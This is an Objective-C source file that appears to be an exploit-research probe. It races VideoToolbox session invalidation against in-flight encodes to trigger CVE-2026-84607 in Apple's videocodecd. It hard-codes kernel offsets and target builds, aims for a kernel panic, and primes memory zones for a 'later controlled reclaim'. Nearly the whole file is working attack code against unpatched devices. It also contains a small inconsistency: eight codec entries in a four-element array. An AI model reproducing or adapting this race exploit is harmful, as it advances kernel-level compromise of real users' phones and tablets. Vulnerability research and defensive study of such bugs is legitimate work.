//
//  P085AVE84607Racer.m — 84607 Close-vs-async racer (P007 port of P064 v4).
//  Algorithm identical to Lum1na P064AVE84607Racer v4.1; logging moved to
//  the P007 per-probe file pattern (F_FULLFSYNC per line, survives panic).
//

#import "P085AVE84607Racer.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"

#import <VideoToolbox/VideoToolbox.h>
#import <CoreVideo/CoreVideo.h>
#import <CoreMedia/CoreMedia.h>
#import <fcntl.h>
#import <string.h>
#import <stdlib.h>
#import <unistd.h>
#import <libkern/OSAtomicDeprecated.h>

#define P085_BUILD              @"p085-ave84607-racer-v4"
#define P085_W                  640
#define P085_H                  360
#define P085_SESSIONS           4
#define P085_FRAMES_PER_SESSION 8
#define P085_SETTLE_US          200000
#define P085_ITERATIONS         8

typedef struct {
    int32_t completions;
    int32_t lateCompletions;
    int32_t invalidated;
    int32_t submitted;          /* frames submitted to the encoder */
    int32_t phase;              /* 0=encoding, 1=racing */
} P085Ctx;

static NSMutableString *g_log = nil;
static int g_fd = -1;
static void L(NSString *s) {
    if (!g_log) return;
    NSString *out = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
    [g_log appendString:out];
    if (g_fd >= 0) {
        const char *p = out.UTF8String;
        if (p) { write(g_fd, p, strlen(p)); fcntl(g_fd, F_FULLFSYNC); }
    }
}

static void P085OutputCallback(void *userData,
                               void *sourceFrameRefCon,
                               OSStatus status,
                               VTEncodeInfoFlags infoFlags,
                               CMSampleBufferRef sampleBuffer)
{
    (void)sourceFrameRefCon; (void)status; (void)infoFlags;
    P085Ctx *ctx = (P085Ctx *)userData;
    int32_t phase = __atomic_load_n(&ctx->phase, __ATOMIC_RELAXED);
    __atomic_add_fetch(&ctx->completions, 1, __ATOMIC_RELAXED);
    if (phase == 1) {
        __atomic_add_fetch(&ctx->lateCompletions, 1, __ATOMIC_RELAXED);
    }
    if (sampleBuffer) CFRelease(sampleBuffer);
}

static CVReturn P085MakePixelBuffer(CVPixelBufferRef *out)
{
    /* A14 encoders require IOSurface-backed pixel buffers (v1 device evidence). */
    NSDictionary *attrs = @{
        (NSString *)kCVPixelBufferIOSurfacePropertiesKey: @{},
    };
    return CVPixelBufferCreate(NULL, P085_W, P085_H,
        kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
        (__bridge CFDictionaryRef)attrs, out);
}

@implementation P085AVE84607Racer

+ (NSString *)tap {
    g_log = [NSMutableString string];
    NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    g_fd = open([[docs stringByAppendingPathComponent:@"p085_ave84607_racer_log.txt"] UTF8String],
                O_CREAT | O_WRONLY | O_TRUNC, 0644);

    L([NSString stringWithFormat:@"=== p085 session %@ BUILD %@ ===",
        LabLocalMilitaryNow(), P085_BUILD]);
    L(@"CVE-2026-84607 Close-vs-async racer. UNPARKED by owner 2026-10-10.");
    L(@"Pins: clientClose 0x8371094 stopAsync 0x8370174 sendAsync 0x837137C.");
    L(@"sendAsync uses UC+0x118/+0x160/+0xd8 WITHOUT the +0x158 lock.");
    L(@"v3 device proof: completion delivered AFTER clientClose (gap precondition PROVEN).");
    L(@"Goal: kernel panic task=videocodecd PC~0x137C/0x1094 -> ips names waiter zone.");
    L(@"Client SIGTRAP crashes = expected gap signatures. One tap per fresh boot.");
    L(@"Dual SKU: A14 23F77 and A12X 23G71 (84607 fixed in 26.7, live on both).");
    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p085"];
    if (stop) {
        L(stop);
        if (g_fd >= 0) { fcntl(g_fd, F_FULLFSYNC); close(g_fd); }
        return g_log;
    }
    L([LabDeviceProfile identBlock]);

    uint32_t iterationsRun = 0, racesFired = 0, sessionsCreated = 0;

    for (uint32_t it = 0; it < P085_ITERATIONS; it++) {

        /* -- Phase 1: build the fleet (mixed codecs, all alive) -- */
        __block VTCompressionSessionRef *sessions =
            calloc(P085_SESSIONS, sizeof(VTCompressionSessionRef));
        __block P085Ctx *ctxs = calloc(P085_SESSIONS, sizeof(P085Ctx));
        memset(ctxs, 0, P085_SESSIONS * sizeof(P085Ctx));

        CMVideoCodecType codecs[P085_SESSIONS] = {
            kCMVideoCodecType_H264, kCMVideoCodecType_HEVC,
            kCMVideoCodecType_H264, kCMVideoCodecType_HEVC,
            kCMVideoCodecType_H264, kCMVideoCodecType_HEVC,
            kCMVideoCodecType_H264, kCMVideoCodecType_HEVC,
        };

        __block int32_t totalEncoded = 0;
        for (int s = 0; s < P085_SESSIONS; s++) {
            VTCompressionSessionRef sess = NULL;
            OSStatus st = VTCompressionSessionCreate(
                NULL, P085_W, P085_H, codecs[s],
                NULL, NULL, NULL,
                P085OutputCallback, &ctxs[s], &sess);
            if (st != noErr || !sess) {
                L([NSString stringWithFormat:@"[-] iter %u sess %d: create -> %d",
                    it, s, (int)st]);
                sessions[s] = NULL;
                continue;
            }
            sessions[s] = sess;
            sessionsCreated++;

            NSDictionary *props = @{
                (__bridge NSString *)kVTCompressionPropertyKey_AverageBitRate: @1500000,
            };
            VTSessionSetProperties(sess, (__bridge CFDictionaryRef)props);
            st = VTCompressionSessionPrepareToEncodeFrames(sess);
            L([NSString stringWithFormat:@"[*] iter %u sess %d: Prepare -> %d",
                it, s, (int)st]);
        }

        /* -- Phase 2+3 MERGED (v2): the flood NEVER stops while the wave
           fires. The stale waiter (+0x160/+0x118 machinery) lives in
           videocodecd's UC; videocodecd's allocator is fed by OUR encode
           stream. Overlap maximizes unlocked sendAsyncResult64 entries
           concurrent with stopAsync AND keeps the completion zones
           churning for a later controlled reclaim. -- */
        dispatch_group_t g = dispatch_group_create();
        dispatch_queue_t q = dispatch_queue_create("com.p007.p085.wave",
                                                   DISPATCH_QUEUE_CONCURRENT);
        for (int s = 0; s < P085_SESSIONS; s++) {
            if (!sessions[s]) continue;
            dispatch_group_async(g, q, ^{
                int32_t enc = 0;
                for (int f = 0; f < P085_FRAMES_PER_SESSION; f++) {
                    CVPixelBufferRef pb = NULL;
                    if (P085MakePixelBuffer(&pb) != kCVReturnSuccess) continue;
                    if (CVPixelBufferLockBaseAddress(pb, 0) == kCVReturnSuccess) {
                        memset(CVPixelBufferGetBaseAddress(pb), 0x7F,
                               CVPixelBufferGetDataSize(pb));
                        CVPixelBufferUnlockBaseAddress(pb, 0);
                    }
                    /* v4: count the submit BEFORE the remote call blocks —
                       the gate sees real submissions instantly */
                    __atomic_add_fetch(&ctxs[s].submitted, 1, __ATOMIC_RELAXED);
                    OSStatus st = VTCompressionSessionEncodeFrame(sessions[s], pb,
                            CMTimeMake(f, 30), CMTimeMake(1, 30), NULL, NULL, NULL);
                    if (st == noErr) __atomic_add_fetch(&enc, 1, __ATOMIC_RELAXED);
                    CVPixelBufferRelease(pb);
                }
                __atomic_add_fetch(&totalEncoded, enc, __ATOMIC_RELAXED);
            });
        }
        for (int s = 0; s < P085_SESSIONS; s++) {
            if (!sessions[s]) continue;
            dispatch_group_async(g, q, ^{
                /* v4: gate on submitted>=3, cap 200ms */
                for (int w = 0; w < 200; w++) {
                    if (__atomic_load_n(&ctxs[s].submitted, __ATOMIC_RELAXED) >= 3) break;
                    usleep(1000);
                }
                __atomic_store_n(&ctxs[s].phase, 1, __ATOMIC_RELAXED);
                VTCompressionSessionInvalidate(sessions[s]);
                __atomic_add_fetch(&ctxs[s].invalidated, 1, __ATOMIC_RELAXED);
            });
        }
        dispatch_group_wait(g, dispatch_time(DISPATCH_TIME_NOW, 15 * NSEC_PER_SEC));

        if (totalEncoded == 0) {
            L(@"[-] nothing in flight — aborting iteration");
            for (int s = 0; s < P085_SESSIONS; s++) {
                if (sessions[s]) {
                    VTCompressionSessionInvalidate(sessions[s]);
                    CFRelease(sessions[s]);
                }
            }
            free(sessions);
            free(ctxs);
            continue;
        }

        /* -- Phase 4: drain + report -- */
        usleep(2 * P085_SETTLE_US);
        for (int s = 0; s < P085_SESSIONS; s++) {
            __atomic_store_n(&ctxs[s].phase, 0, __ATOMIC_RELAXED);
            int32_t late = __atomic_load_n(&ctxs[s].lateCompletions, __ATOMIC_RELAXED);
            if (late > 0) {
                racesFired += (uint32_t)late;
                L([NSString stringWithFormat:@"[+] GAP SIGNATURE sess %d: %d late completions",
                    s, (int)late]);
            }
        }
        iterationsRun++;

        L([NSString stringWithFormat:@"[*] iter %u done: totalEncoded=%d",
            it, (int)totalEncoded]);

        for (int s = 0; s < P085_SESSIONS; s++) {
            if (sessions[s]) {
                VTCompressionSessionInvalidate(sessions[s]);   /* idempotent-safe */
                CFRelease(sessions[s]);
            }
        }
        free(sessions);
        free(ctxs);
        usleep(P085_SETTLE_US);
    }

    L([NSString stringWithFormat:@"=== p085 v1 done: %u iters, %u sessions, %u late completions ===",
        iterationsRun, sessionsCreated, racesFired]);
    L(@"=== HONESTY === late completions / panic = kernel gap evidence. NOT hasKread.");
    L(@"If panicked: ips task=videocodecd PC near 0x137C/0x1094 names the waiter zone.");
    L(@"Recovery packet: copy from banner/Settings; do not scrape this console.");
    if (g_fd >= 0) { fcntl(g_fd, F_FULLFSYNC); close(g_fd); }
    return g_log;
}

@end